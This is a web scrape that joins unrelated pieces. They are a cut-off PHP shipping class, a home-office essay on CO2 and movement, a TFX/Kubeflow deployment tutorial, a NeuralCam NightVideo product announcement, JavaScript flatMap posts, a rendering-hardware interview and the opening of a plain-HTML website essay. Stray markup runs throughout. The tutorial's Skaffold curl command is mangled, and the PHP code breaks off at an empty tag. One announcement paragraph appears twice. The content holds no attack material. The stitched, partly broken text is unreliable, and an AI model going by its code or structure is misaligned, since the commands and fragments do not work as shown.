<span>        </span><span>if</span><span> (</span><span>$</span><span>shippingCost</span><span> </span><span>&lt;=</span><span> </span><span>0</span><span>) </span><span>{</span>
<span>            </span><span>throw</span><span> </span><span>new</span><span> </span><span>\</span><span>Exception</span><span>(</span><span>'</span><span>Shipping price cannot be less than or equal to zero</span><span>'</span><span>)</span><span>;</span>
<span>        </span><span>}</span>

<span>        </span><span>return</span><span> </span><span>$</span><span>shippingCost</span><span>;</span>
<span>    </span><span>}</span>
<span>}</span></code></pre>
<p>But then for worldwide shipping, we want these rules to be slightly different, so we create a child class that extends the Shipping class.</p>
<pre><code><span>&lt;?php</span>

<p>It’s been nearly ten years that I have worked mainly from home (or more accurately, <em>homes</em>, as we moved around a bit). As it turns out, many people now work from home, less so by choice than by <s>dystopian scenario C</s> circumstance. Whilst I’m sure that there are already hundreds of articles on the topic I thought I’d write a bit about my experience and especially about some aspects that may not be that obvious and that took me a while to prioritize.</p>
<h2 id="h-indoor-co2-level">Indoor CO<sub>2</sub> level </h2>
<p>What is very often overlooked when working from home is the topic of air quality and particularly the one of CO<sub>2</sub> level. Modern offices mostly have ventilation systems that constantly bring in fresh air (at an adjusted temperature) – you may not even be aware of them when working at an office as they’re often built into the ceiling. I’m not talking about air conditioning here – that’s a different process which focuses on changing the temperature, not the air itself.</p>
<p>Do you know the feeling you have after sitting one hour in a windowless meeting room with 6 other people and finally getting up again? What’s so tiring about those meetings often isn’t the content of the meeting itself or the other people (although arguably both can be) – it is the lack of fresh air, or rather, the increase of CO<sub>2</sub> level in the room. CO<sub>2</sub> level is measured in particle-per-million (PPM) and the outside air level is typically around 400-500 PPM (although that’s been raising at an alarming rate over the past century). There are by now quite a <a href="https://www.emcoruk.com/news/2018/c02-levels-offices-silently-damaging-uk-productivity-finds-new-study" target="_blank" rel="noreferrer noopener">few</a> <a href="https://hbr.org/2017/03/research-stale-office-air-is-making-you-less-productive" target="_blank" rel="noreferrer noopener">studies</a> <a href="https://ehp.niehs.nih.gov/doi/10.1289/ehp.1510037" target="_blank" rel="noreferrer noopener">on</a> <a href="https://thinkprogress.org/exclusive-elevated-co2-levels-directly-affect-human-cognition-new-harvard-study-shows-2748e7378941/" target="_blank" rel="noreferrer noopener">the</a> <a href="https://www.researchgate.net/publication/41464093_Work_performance_productivity_and_indoor_air" target="_blank" rel="noreferrer noopener">topic</a>, the findings are pretty clear: increased CO<sub>2</sub> levels make it harder to focus and think:</p>

<p>With a baseline of ~400 PPM (here in Vienna) you can now see why the current indoor CO<sub>2</sub> as I am writing this article is not ideal:</p>

<p>So if you’re now working at home and your home does not have a built-in air-conditioning system, there are a few things that you can do:</p>
<ul><li>get a CO<sub>2</sub> monitor. The one I have for 2 years now is the <a href="https://www.tfa-dostmann.de/en/produkt/co2-monitor-airco2ntrol-mini/" target="_blank" rel="noreferrer noopener">TFA Dostmann Air CO2ntrol mini</a> and I am quit happy with it. It is important to get a good monitor / sensor, as wrong readings won’t help you much.</li><li>get a flew plants. <a href="https://luxafor.com/top-9-best-air-purifying-plants-for-office-that-are-low-effort-and-care-guide/" target="_blank" rel="noreferrer noopener">NASA has some recommendations</a> on plants that are good filters. One thing to be aware of though is that plants are producing CO2 at night, so I wouldn’t recommend getting many of those plants if your home office is in your bedroom (which I would not recommend at all anyway)</li><li>advanced: setup air ventilation for your home office (or your entire home if you feel like it). This is what I am doing now after spending a few years getting up to open and close the window every half hour (and wasting quite a bit of energy during the winter). This is a sizeable investment so you have to know you’re going to use the home-office for a longer stretch of time</li></ul>
<h2 id="h-movement-or-lack-thereof">Movement (or lack thereof)</h2>
<p>It took me ten years and a pandemic to figure out the prevalence of lack of movement in a “working from home” setting. Moving (walking, standing up, etc.) is built-in to the flow of working in an office with other people: going to the meeting room, fetching a coffee, going out for lunch, etc. — and even if it does not seem that much, all these steps add up during the day. When working from home for longer periods of time it requires discipline to build these habits back into the daily rhythm. Absence of commute (with all the advantages it brings, especially for longer, time-consuming commutes) also means absence of a planned period of movement. And unless you have a large apartment or house, chances are that the relative lack of space makes it less appealing to walk around.</p>
<p>I’m sure I could find a nice set of studies showing that lack of movement is bad for productivity and health. But you already know that. It is repeated so often by so many health professionals that the opposite effect takes place and people simply ignore the advice. The first question you get during a routine physical examination with your doctor is: <em>do you exercise regularly</em>? But this isn’t about exercising or doing sports (which are both very good things to do, of course) – it is about the fact that we humans are designed to walk. We evolved over millennia to function as hunter-gatherers. And it isn’t the past century that will undo and teach our bodies to function properly whilst sitting or standing all day long at a desk. So:<strong> move</strong>. <strong>Every.</strong> <strong>Day.</strong></p>

<p>Now, clearly, the current pandemic and its restrictions do not help. But it may just be that because of these restrictions that restrict the natural type of movement that it is even more important to pay even more attention to getting enough of it.</p>
<p>A few actionable things you can do to help getting enough movement:</p>
<ul><li>get one of those fitness trackers and set a goal to do 10000 steps (or more) per day</li><li>introduce a virtual commute at the beginning and end of your work day</li><li>advanced: build a habit to run regularly (I run almost every day)</li></ul>
<h2 id="h-light-and-lighting">Light and lighting</h2>
<p>I’m not mentioning this topic because of “light ergonomics”, i.e. having another source of light in addition to your computer screen in order to reduce eye strain. Or because of <a href="https://en.wikipedia.org/wiki/Seasonal_affective_disorder" target="_blank" rel="noreferrer noopener">seasonal affective disorder</a>. What I’m after here is how incorrect lighting can affect sleep and creativity.</p>
<p><a href="https://medium.com/s/how-to-design-creative-workspaces/how-to-use-the-psychology-of-light-and-lighting-to-boost-your-creativity-b61a574b5751" target="_blank" rel="noreferrer noopener">Light and lighting help us think</a>. Being always exposed to the same light – color and luminosity – is not only disruptive for our circadian rhythm, negatively impacting the sleep but also for our thought process.</p>

<p>I ended up equipping my office with <a href="https://www.ikea.com/gb/en/cat/smart-lighting-36812/" target="_blank" rel="noreferrer noopener">Ikea Tradfri</a> panels and bulbs which can be remote controlled and even programmed to change brightness and color / warmth as the day progresses.</p>
<h2 id="h-all-the-rest">All the rest</h2>
<p>To me the following points are obvious and I think they’re also covered in many other articles or aren’t necessarily related to working in a home-office. That does not make them less important though. So just for good measure here they are:</p>
<ul><li>if you can, avoid working in the same room than you sleep. If you can’t, physically separate the space with a <a href="https://en.wikipedia.org/wiki/Folding_screen" target="_blank" rel="noreferrer noopener">folding screen</a></li><li>use an ergonomic chair</li><li>use a sit-stand desk and make it a habit to stand up from time to time</li><li>prefer one large / wide screen to several ones. Avoid using screens of different sizes (such as laptop &amp; external monitor)</li><li>if you type a lot, prefer an ortholinear keyboard and a touchpad to a classic keyboard and mouse to prevent <a href="https://en.wikipedia.org/wiki/Carpal_tunnel_syndrome" target="_blank" rel="noreferrer noopener">carpal tunnel syndrome</a></li><li>take regular breaks, using timers if need be</li><li>drink enough water</li><li>move. Seriously, don’t forget to move.</li></ul>

<blockquote><p>If I had a dollar for every machine learning model wasting in Jupyter Notebooks across the industry, I’d be a millionaire. — Me</p></blockquote>



<p>It is one thing to build models, yet another to put them in production. One of the hardest parts of machine learning is effectively putting models in production.&nbsp;</p>



<p>With an emphasis on <strong>effectively</strong> here, because while there are lots of ways to put models in production, there exist few tools that can effectively deploy, monitor, track, and automate this process.</p>



<p>In this tutorial, I’m going to introduce you to <strong>TensorFlow Extended, popularly known as TFX. </strong>You’re going to take an example machine learning project and put it in production using TFX, Google AI Platform Pipelines, and Kubeflow.&nbsp;</p>

<h2 id="Introduction">Introduction to TFX and Kubeflow</h2>



<p>TFX is a production-scale machine learning platform based on Tensorflow. It is owned and actively maintained by Google, and it’s used internally at Google.&nbsp;</p>

<p><strong>TFX provides a bunch of frameworks, libraries, and components for defining, launching, and monitoring machine learning models in production.&nbsp;</strong></p>



<p>The components available in TFX let you build efficient ML pipelines specifically designed to scale from the start. These components include:</p>



<ul><li>modeling,&nbsp;</li><li>training&nbsp;</li><li>serving (inference),&nbsp;</li><li>and managing deployments to different targets like web, mobile or IoT devices.</li></ul>



<p>In the diagram below, you see a relationship between available TFX libraries and available pipeline components you can use to achieve this.&nbsp;</p>

<hr>



<p>You’ll notice that TFX libraries and components cover a typical end-to-end machine learning pipeline, which starts with data ingestion and ends with model serving.</p>



<p>The TFX libraries for achieving the different tasks shown above are available in Python and can be installed separately. But it’s advisable to just install TFX, which comes with all the components.&nbsp;</p>



<p><strong>As you proceed along with this tutorial, you’ll use different TFX components, and I’ll first explain what it does before showing you how to use it.&nbsp;</strong></p>






<h3><strong>TFX under the hood and orchestrators</strong></h3>



<p>By default, TFX creates a directed acyclic graph (DAG) of your ML pipeline. It uses <a href="https://beam.apache.org/" target="_blank" rel="noreferrer noopener nofollow">Apache-Beam</a> under the hood for managing and implementing pipelines, and this can be easily executed on distributed processing back-ends like <a href="https://spark.apache.org/" target="_blank" rel="noreferrer noopener nofollow">Apache Spark</a>, <a href="https://cloud.google.com/dataflow" target="_blank" rel="noreferrer noopener nofollow">Google Cloud Dataflow,</a> <a href="https://flink.apache.org/" target="_blank" rel="noreferrer noopener nofollow">Apache Flink</a>, and so on.&nbsp;</p>



<p>It’s important to mention that Beam comes with a direct runner, so it can be used in scenarios like testing or small deployments.&nbsp;</p>



<p>While TFX running Apache Beam is cool and all, it is difficult to configure, monitor, and maintain defined pipelines and workflows. This gave rise to tools we call orchestrators.&nbsp;</p>



<p>Orchestrators like Kubeflow or Apache Airflow make it easy to configure, operate, monitor, and maintain ML pipelines. They mostly come with GUIs that you can easily understand.&nbsp;</p>



<p><strong>Below is a sample GUI of Airflow showing defined tasks:</strong></p>

<h2 id="Set">Set up Cloud AI Platform Notebook</h2>



<p>Next, you’re going to set up a Notebook in the AI Platform. This lets us perform experiments in the familiar Jupyter Notebook environment. To instantiate this new notebook, follow the steps below:</p>



<ul><li>Select the <strong>AI Platform</strong> option from the GC hamburger menu, and click <strong>Notebooks</strong> option.</li><li>Next, select the <strong>Enable Notebooks API </strong>and then click on<strong> NEW INSTANCE </strong>to create a new Notebook instance on the AI Platform.</li><li>Depending on what you want to do and your budget, you can choose a custom startup library to add to your Notebook instance. For this article, I’ll use the Tensorflow 2.1 version with no GPU installed.&nbsp;</li></ul>

<p>In the opened Jupyter Notebook, you’re provided with a template file in the <strong>imported</strong> folder that helps you perform some important configuration and setup, as well as a template for working with TFX components.&nbsp;</p>



<p>We’ll leverage a lot of this configuration later, but for now let’s start building our project.&nbsp;</p>



<p>In the notebook, create a new folder for your project (<strong>advert-pred</strong>). In that folder, create a new Jupyter notebook (<strong>advert-experimentation</strong>) and open it.&nbsp;</p>

<p>In this Jupyter notebook, you’re going to walk through each TFX component individually and interactively. <strong>This will help you understand what each component is doing</strong>, and then at the end, you’ll turn your experimentation into a full pipeline and deploy it.</p>



<p>You can get the complete notebook <a href="https://github.com/risenW/tfx-adClickPrediction/blob/master/advert-experiment.ipynb" target="_blank" rel="noreferrer noopener nofollow">here</a> and the complete project code <a href="https://github.com/risenW/tfx-adClickPrediction" target="_blank" rel="noreferrer noopener nofollow">here</a>.</p>






<h3><strong>Setup</strong></h3>



<p>In the first cell of your notebook, you’ll install TFX, Kubeflow (kfp) and a package called skaffold:</p>



<pre># Install tfx <span>and</span> kfp Python packages.
import sys
!{sys.executable} -m pip install --user --upgrade -q tfx==<span>0.22</span><span>.0</span>
!{sys.executable} -m pip install --user --upgrade -q kfp==<span>1.0</span><span>.0</span>
# Download skaffold <span>and</span> <span>set</span> it 
!curl ///skaffold//latest/ /home//.local//Import packages
</pre>



<p><a href="https://skaffold.dev/" target="_blank" rel="noreferrer noopener nofollow"><strong>Skaffold</strong></a><strong> is a command line tool that facilitates continuous development for Kubernetes applications</strong>. It helps us easily manage and handle workflows for building, pushing, and deploying applications. You’ll get to understand the use of Skaffold later.&nbsp;</p>

          <div>
            

<p>Hey everyone, <br>

for the past few months we have been working on a new product, and today we’re finally ready to show it to you.
</p>

<div><p>As you probably know, at NeuralCam we have a <a href="https://apps.apple.com/us/app/neuralcam-nightmode/id1474856599" target="_blank">photo NightMode app</a> that’s recognized as the leading night mode solution for iPhones without a built-in photo Night Mode. Ever since the launch of our night mode app, a question kept popping up from our users: <i>“can you build a night mode app for video?”</i>, they asked. 
</p><p>

We’ve pondered this for a while. Unlike photography, there is no obvious straightforward way to build night mode for video. In the case of photos, night mode usually means taking multiple shots with relatively long exposure and combining them into one high quality image. Then brightening and post-processing it for a final look. 

 </p></div>



<p><b>Video</b> is a different beast: you can’t just shoot multiple frames and combine them because you’re limited by both the maximum exposure time a frame can have and by the maximum processing time per frame (milliseconds instead of seconds in the case of real-time video). 

</p>

<p>Clearly, a very different approach is needed. We’ve explored everything from classic to AI-powered video processing techniques and we think we found the right mix of tech that results in much improved low light videos. After months of researching, hacking and developing, we’re proud to present NeuralCam NightVideo, our (and perhaps the world’s first) <b>Video Night Mode</b> app.

</p>
<p><img src="https://neural.cam/news/nightvideo/content/nvid.png">
</p>
<br>

<h3 id="when-they-ghost-mid-project">Night Mode Video</h3>

<p>So how can we build Video NightMode? Where do we get started and why can’t we just take a normal video and brighten it up? Well, because it would look really bad.
</p>

<p>The biggest problem in low light videography (and photography for that matter) is the presence of noise. There’s just too little amount of light hitting the image sensor and this lack of information results in a flickering mess of pixels with different light intensities and colors appearing especially in the darker areas of the scene - not a pleasant view.
</p>
<p>In the case of the photography night mode, this noise is reduced by the mentioned frame merging process - which basically results in more information being added to the target frame. However, with video we don’t have the luxury of multiple frames and processing for seconds to do the processing so we’ll clearly have to find a very different approach. 

</p><h3 id="when-they-ghost-mid-project">Capturing and AI frame-boosting</h3>

<p>The first thing we’re doing is to try to capture the most light inside each frame, which naturally results in less noisy frames. 

</p>

<p>As a standard practice, videos are shot at a shutter speed of no more than 1/24 to keep moving objects sharp and the video smooth. But this also means that this is the maximum amount of time that light can reach the sensor.
</p>

<p>We’ve looked very closely at this problem and figured that there might be a way to let more light in while maintaining the smooth look of the video, namely a combination of longer exposure times and frame interpolation. This way we can use exposure times longer than 1/24 depending on the amount of available light, and then in order to keep the video looking smooth, we generate additional frames using a proprietary Machine Learning powered Video Interpolation algorithm that we’ve built especially for this purpose.</p>

<p>
 The result is a smooth video with a tiny amount of blur - depending on the used settings - and generally a nice “night video” look.

</p>

<p><img src="https://neural.cam/news/nightvideo/content/interp.png">
<br>
</p>



<h3 id="when-they-ghost-mid-project">AI Powered Video Denoising</h3>


<p>Doing the capturing part this way we’ve got higher quality frames, but these generally still have a lot of noise so what we’ll do next is to try to get rid of that.
</p>

<p>It turns out that classic denoising methods aren’t good enough for this case, they usually blur the whole image, including edges and are helpless at the noise levels present in low light shots taken with a smartphone camera. Also, they’re quite slow as well.
</p>

<p>To solve this problem we’ve built a Machine Learning-based denoising algorithm. Specially developed for the iPhone camera, it removes even the heaviest noise and does so selectively and adaptively only on the areas of the image where noise is present. The result is a much cleaner look in the bright areas of the video and a massive reduction of the ugly flickering effect in the darker parts of the image.

</p>

<h3>Brightening</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<h3>Different Video Night Modes</h3>


<p>As a final step after the capturing, interpolation and denoising, it’s finally possible to brighten up the image and get a good looking, smooth video as the result. The amount of brightening applied depends on the selected mode.</p>

<br>
</p>
<p>In order to cover as many shooting situations as possible we’ve come up with 5 different capture modes:

</p>



<h4>Day:
</h4>



<p>The first capturing mode is not even a night mode at all. It is targeted at lower light day shots, or scenes with high dynamic range where the results of the default iPhone camera start to get too noisy. This mode contains no brightening, but because of the use of our AI denoising algorithm, resulting videos have a cleaner, more pleasant look. It’s especially useful when used with the ultra wide camera, in the case of which noise can appear even in medium-lit indoor situations.

</p>

<h4>Dusk:</h4>

<p>
  
  This mode is designed for semi-low light. It is similar to Day mode, shot at a high frame rate to maintain sharp subjects in high movement situations, but in addition to denoising it also includes a bit of additional brightening. 

</p>
<h4>
Night:
</h4>

<p>The “Night” mode is the default mode for shooting night videos. It uses a slightly longer exposure time, that combined with our denoising and frame interpolation algorithms generates a bright, clean and smooth night video. This is the mode to use for most night scenes. 
</p>

<br>
</p>


<h4>Night+:</h4>

<p>A further enhanced mode for really dark scenes. In this mode, videos have an additional amount of blur but provide a brighter night video with the same clean noise-less look. In most of these situations the built-in camera can't produce usable results.

</p>

<h4>Time-lapse:</h4>

<p>A Night Time-lapse mode, similar to the one on the new iPhone 12 default camera - now made available by NeuralCam NightVideo for older iPhones too. This mode doesn’t have sound and can handle even lower light situations, which combined with a faster playback, generates the specific night mode time-lapse look. 

</p>

<source src="https://neural.cam/news/nightvideo/content/timelapse.mp4" type="video/mp4">

<br>
</p>

<h4>*Gentle Light:</h4>

<p>Each of the modes can be combined with the “gentle light” feature, where the app turns on the flashlight, but at one of the lowest levels in order to keep the resulting video still natural and avoid “blinding” people. Gentle light can be used in totally dark scenes with subjects that are close enough to be illuminated by a small amount of light.
</p>

<h3>Real-time on-device processing</h3>

<p>All this processing runs in real-time on the iPhone, making full use of the power the NeuralEngine provides. This real-time processing means that we can provide the same instant video capturing experience you’re used to with your default camera - tap to capture and everything is displayed and processed on the fly. Since this level of video processing requires quite some processing power, NightVideo is only available on devices with the A12 NeuralEngine (iPhone XR and later) and iOS 14.


</p><p>

  With real-time processing and modes covering everything from slightly low light settings to really dark scenes, NeuralCam NightVideo is the first app to provide Night Mode for Video.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><article><div><h2>FlatMap is a great functional operation</h2><p>FlatMap can be implemented as follows:</p><pre><code>    Array.prototype.flatMaper = function(mapFunction) { return this.map(mapFunction).reduce((a, c) =&gt; { return [ ...a, ...(c.length ? c : [c]) ]; }, []) }</code></pre><p>Which is a method on Arrays (when implemented) which will do something akin to mapping over each value in an array, doing some operation, followed by a reduce step which then takes each object returned from that inital map step and if that object is an array, then flattens or spreads the array into the final resulting array (the reduce step's accumulator) if the current object from the map step is not an array then the object itself is added into the resulting array (which is again, the reduce steps accumulator). The reduce steps accumulator in this flatMap implementation is an empty array.</p><p>This is an example of just flattening an array of arrays without mapping:</p><pre><code>     [[1], [2,3]].reduce((a, c) =&gt; { return [ ...a, ...c ]; }, [])</code></pre><p>Which will produce the same as the following. Here I have the map function returning the values from the array unchanged, removing the use of the map step, in an attempt to show how this is similar to the reduce example flattening arrays above:</p><pre><code>    [[1], [2,3]].flatMap(x =&gt; x)</code></pre><p>This results in output:</p><pre><code>    [1, 2, 3]</code></pre><h2>Map, flatMap and the 1 to 1 vs 1 to many outputs</h2><p>FlatMap is great in my opinion because while with map you get to iterate over each value, doing some operation, with flatMap you can have your operation return any number of results. This removes to 1 to 1 constraint that you get between values and results when mapping over an array.</p><h2>Convincing? examples of why flatMap is so great</h2><h3>You can now iterate over a list creating a new list with any number of values</h3><p>Let's say you have some need to take a list and get all variations of that list. You might normally make some array and forEach iterate over each item.</p><pre><code>    const items = ["book", "dog"];
    let variations = [];
    items.forEach(item =&gt; {
        variations.push(item);
        variations.push(item + "s");
    });</code></pre><p>Or:</p><pre><code>    const items = ["book", "dog"];
    let variations = [];
    items.forEach(i =&gt; variations = variations.concat([i, i + "s"]))</code></pre><p>But now with flatMap:</p><pre><code>    const items = ["book", "dog"];
    let variations = [];
    items.flatMap(i =&gt; [i, i + "s"])</code></pre><h3>Creating a list of all combinations of items in two lists</h3><pre><code>    [1, 3].flatMap(d =&gt; [2, 4].map(v =&gt;[d, v]))</code></pre></div></article></div></div></section></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><article><div><h2>Getting something similar to Python style list comprehension in Javascript</h2><p>The javascript spread operator opened my eyes to an easy way to get Python style list comprehension in Javascript.</p><p>By creating an array and spreading another array into it while doing some operation on the inner array we effectively have Python style list comprehension.</p><p>For example:</p><pre><code>    const anArray = [1,2,3];
    console.log([ ...anArray.map(x =&gt; x*2)]);</code></pre><p>This will print out:</p><pre><code>    [ 2, 4, 6 ]</code></pre><p>The similar code in Python would be:</p><pre><code>     [ n * 2 for n in [1, 2, 3] ]</code></pre><p>I actually think that using spread is more readable in some ways. It all makes sense that you can piece together the spread operator with the functional style methods on Arrays to get the same functionality as a list comprehension in Python to me. I like that this "problem" is solved by a combination of basic Javascript functionality instead of creating a new syntax just to add functionality like a list comprehension as well.</p><h3>Differences with the Python style list comprehension</h3><p>What I really like about this use of the spread operator in relation to the list comprehension is that you can mix and match the arrays you spread into the new array. With Python I do not believe it is possible to use a single list comprehension to do some ordered concatenation of multiple resulting arrays use a list comprehension.</p><p>This is a pretty useful, common operation which makes me appreciate the spread operator.</p><p>For example:</p><pre><code>    const anArray = [1,2,3];
    const anotherArray = [2,4,6];
    console.log([ ...anArray.map(x =&gt; x*2), ...anotherArray.map(x =&gt; x/2)]);</code></pre><p>This will print out:</p><pre><code>    [ 2, 4, 6, 1, 2, 3 ]</code></pre><p>The python code for this would require concatenating 2 seperate list comprehensions I believe.</p><p>I know you can <a href="https://stackoverflow.com/questions/16568056/nested-list-comprehension-with-two-lists">iterate over multiple lists at the same time in Python</a> but I don't believe you can perform operations on lists and then order the results in any specific manner like the example does above.</p><h2>Python list comprehension using multiple lists</h2><p>In Python you can create a list comprehension that results in the combination of every value from the different lists:</p><pre><code>    [x + y for x in [1, 3] for y in [2, 4] ]</code></pre><p>In Javascript the closest I could get was:</p><pre><code>    [1, 3].flatMap(d =&gt; [2, 4].map(v =&gt; d + v))</code></pre><h2>Lists or iterables?</h2><p>Yes, I am saying lists when referring to what the list comprehension is iterating over. Technically, this would be any object which is iterable. An <a href="https://wiki.python.org/moin/Iterator">explanation to what makes an object iterable</a>.</p></div></article></div></div></section></div>]]>

<p>(Interview of Prof. Dr. Philipp Slusallek, accomplished scientist and veteran from the computer graphics field, performed in January 2015 for Seekscale company, a cloud rendering startup)</p>



<p>Hardware acceleration is hot in rendering industry right now, and while people still try to figure out how to split workloads between CPUs and GPUs, FPGAs are quickly rising. We interviewed Philipp Slusallek, Scientific Director and Computer Graphics professor at Saarland University, and talked about what’s hot right now, and above all what we can expect in CG in the near future! We first heard about Philipp by coming across this great <a href="http://www.scarydevil.com/~peter/io/raytracing-vs-rasterization.html" target="_blank" rel="noreferrer noopener">discussion</a>.</p>



<p><strong>– What rendering techniques are best adapted to each hardware (GPU/CPU)?</strong></p>



<p>We basically have two key algorithms for rendering: rasterization and ray tracing. Rasterization is a “forward” rendering approach that renders the triangles in a scene one by one (conceptually) and each time updates all pixels covered by that triangle. Ray tracing, on the other hand, traces rays for each pixel to find out which triangle is visible for that pixel.</p>



<p>While the two seem very different, there are intermediate versions, such as “tile-based rasterization” or “frustum tracing”, where only the triangles covering a part of the screen are rasterized or all rays of a tile a traced together, respectively. If you make these tiles smaller, eventually a single pixel in size, rasterization starts to look much like ray tracing and vice versa as you trace larger and larger frusta. However, we still do not have algorithms that really cover the whole range of options well.</p>



<p>Additionally, we are seeing an increased need for advanced (programmable) shading and lighting effects (e.g. global illumination for smooth indirect illumination). While they are sitting on top of the core renderer, they impose many requirements that will determine what rendering approach can or cannot be used.</p>



<p>On the HW (hardware) side: GPUs started as HW dedicated for rasterization. But they have long evolved to become essentially large parallel compute engines (with some dedicated HW thrown in for rasterization, still). On the other hand, CPUs have become much better at parallel workloads with multi-core, multi-threading, and more and increasingly wide SIMD compute units (MMX, SSE, AVX, and the now upcoming AVX-512).</p>



<p>In some sense the two general HW designs are converging towards a similar sweet spot, but coming from two very different starting points.</p>



<p>Rasterization is more dependent on good HW support to be fast and so runs best on GPUs. Ray-tracing can be implemented with very good performance on each HW architecture, probably with some advantage for CPU-like architectures if you look at the latest comparison in the Embree paper at Siggraph 2014 (which may be a bit biased).</p>



<p><strong>– For a developer working on a renderer, what is the technical arbitrage between writing for a CPU, and for a GPU?</strong></p>



<p>Let me focus on writing a full ray tracing renderer using the raw HW. Writing a “renderer” that makes good use of OpenGL/DirectX is a very different story.</p>



<p>First of all writing a really good renderer is a big challenge — but also a lot of fun, independent of the choice of rendering algorithm or HW. It reaches across many levels from highly optimized inner loops all the way up to data management of often complex scenes. It thus touches many aspects of HW and SW and is a perfect poster child for how to best design efficient code for certain HW architectures.</p>



<p>An obvious key element is strongly optimizing the inner loops of a renderer as it determines the upper limit of the achievable rendering performance. This is where a lot of efforts and research has been, and still is, spent. Today, getting the best performance usually still means to hand-optimize the code (at the assembly or intrinsics level) for specific architectures and different choices of renderer configurations. While this often pays off, it requires expert knowledge, is very tedious, and often needs to be completely rewritten as the HW or the requirements change.</p>



<p>In addition, there are also many interdependencies between choices made at this low levels and the various levels of algorithms above it. This means that one needs to keep the code flexible in order for it to adapt to these requirements. However, with current technology, flexibility conflicts strongly with achieving optimal performance.</p>



<p>As a result of all this, almost all renderers have been targeting only one HW architecture: GPUs or CPUs and even within such an architecture, algorithms might have to be configured very differently on different instances. While cross-plattform renderers have been developed, e.g. in OpenCL, OpenCL is still a very low-level language that is not well suited for all HW architectures thus limiting what can be achieved.</p>



<p>In contrast, the hardware vendors each support renderer development with their HW-specific frameworks: Nvidia’s Optix is focused essentially only on GPUs, while Intel’s Embree targets CPU-like architectures (including their MIC/Xeon Phi processors). One interesting note is that both tools (and others) had to develop their own compiler technology to develop these frameworks. While both of these frameworks are very good choices they are black boxes that each come with their own set of drawbacks and limitations.</p>



<p>Already in 2008 we showed that with the right language/compiler tools high optimization of low-level code does not necessarily limit flexibility of the overall design. Our RTFact system [HPG 2008] used C++ template metaprogramming to specialize generic code from across several levels of abstraction at compile time. With this framework, we were able to easily configure very different renderers based on the same generic code and still achieve performance within about 10% of our previous hand-optimized code in each case — which was really remarkable. Unfortunately, writing the core code via C++ template metaprogramming is really hard and results in “write-only code” that is really hard to maintain. But it showed that performance and flexibility are NOT mutually exclusive!</p>



<p>Since then we have teamed up with one of the best compiler research group here at Saarland University (Prof. Sebastian Hack) and have jointly developed “AnyDSL”: It picks up the original idea of RTfact, generalizes it beyond just rendering, and uses much improved compiler technology to implement automatic specialization of generic code. AnyDSL provides a completely new programming models that offers developers a way for formulating hierarchies of conceptual abstractions while still allowing the compiler to eliminate any overhead usually associated with such abstractions (e.g. virtual function calls in C++).</p>



<p>This finally allows for writing completely generic code at each level of abstraction, specifying how that code should make use of abstractions at the lower levels. Finally, at the lowest level, code that has been coming from the different levels is combined and aggressively specialized using novel compiler algorithms to essentially interpret and partially execute any code that is knows at compile time. This is so effective because at these low level a lot of information that we abstracted from at the high levels is now available, such as information about the HW and the context in which some generic high-level code should be executed and which can be taken into account by the compiler. This approach combined the flexibility of hierarchical abstractions with the ability to generate optimized code that rival and often actually exceed the performance of hand-optimized code.</p>



<p>For example, our tests in image processing show that this approach often beats hand-optimized code because that code is very tedious and difficult to write such that not all promising optimization options are actually explored. Since simply use the generic code plus some rather simple mapping code for each specific HW, exploring the space of possible optimizations is much larger.</p>



<p>By now, we have already written a full ray tracer in AnyDSL that compiles and runs efficiently both on various different GPUs and CPUs. However, not all optimizations have been applied yet, so that we cannot really compare its performance yet. This will happen in the next few months but the partial results we have so far are already very promising.</p>



<p><strong>– Corona Render </strong><a href="http://home.seekscale.com/blog/corona-render-1.0-a-peek-into-interactive-rendering"><strong>uses</strong></a><strong> for example Intel Embree ray tracing library, for the CPU. What do you think of this solution?</strong></p>



<p>As I argue above, these tools are very useful. They provide hand-optimized kernels that solve some of the core problems, particular the inner loops and can thus be used as the basis for the higher layers, just as Corona did. However, they are essentially black boxes which makes it harder to adapt them to different purposes.</p>



<p>I believe that we need to go beyond these individual optimized kernels and create generic, adaptable, and reusable building blocks for rendering. That can be combined in flexible ways to create optimized renderers for many configurations and HW platforms. So far, we have been missing the right tools to even think how this could be done.</p>



<p>With AnyDSL we now have a tool that for the first time allows us to address this challenge. Now we are investigating how the to design such a flexible rendering framework: What are the right abstractions to be used at the different levels? How do we best map them to HW platforms? Which algorithms work best in what context and how do we need to formulate them, so they can easily be combined? How do we determine the data layout to optimize for different algorithms using it? And so on.</p>



<p>Essentially, AnyDSL allows us to rethink the design of renderers in a fundamentally new way.</p>

October 23, 2020 | http://john.ankarstrom.se/html2/ | <a href="https://web.archive.org/web/*/http://john.ankarstrom.se/html2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <td colspan="3">
      
      <div id="content">
      <p>Some time ago, I wrote a short article called <a href="http://john.ankarstrom.se/html/">"Writing
HTML in HTML"</a>,
where I explained why I use plain HTML to write, edit and maintain my
web site. As I've been living with my decision to eschew both dynamic
content management systems and static site generators for more than a
year, I've had the chance to reflect upon it, and I think it is time
for me to
update and clarify my original vision.</p>
      <p>In this post, I
want to explore two fundamental principles or criteria that underpinned
my original article, but were more or less unpronounced: <b>sustainability</b> and <b>power</b>. I also want to update you on my current site configuration.</p>
      <p>Before I begin, I should say that these criteria are <em>my</em> criteria, they're what <em>I</em>
value, and don't necessarily line up with what other people value. I think there are others who might value the same
things as I do; others will hopefully find the perspective interesting,
even if they don't ultimately agree.<br>
      </p>
<h3>First criterion: sustainability</h3>
      <p>The criterion of sustainability corresponds to the following question:</p>
      <blockquote>
        <p>How difficult will it be for me to maintain – over time –<br>&nbsp;&nbsp;&nbsp; a) the entire site, and<br>
&nbsp;&nbsp;&nbsp; b) any given page on the site?<br>
        </p>
      </blockquote>
      
      <p>In my life, this is a rather harsh rule. I know that
every extra step I need to perform in order to do something is going to
make me avoid doing it more. For this reason, I will consider even minor things – like needing to
install a single extra piece of software on my computer, even if it
takes only a second to install – to be lowering the sustainability of the web site. Relevant here is not only the effort required for me to edit the site, but also how likely the site is to merely <em>survive</em> over long periods of time, through server migrations and infrastructure changes.<br>
</p><h4>WordPress<br>
      </h4>
      <p>As such, I am not talking about "ease of use". WordPress is likely the
least difficult way to run a blog, but it is not the most <em>sustainable</em> way, because the effort required to maintain a WordPress site <em>over long periods of time</em> is
higher than a folder of static HTML files. To migrate a WordPress
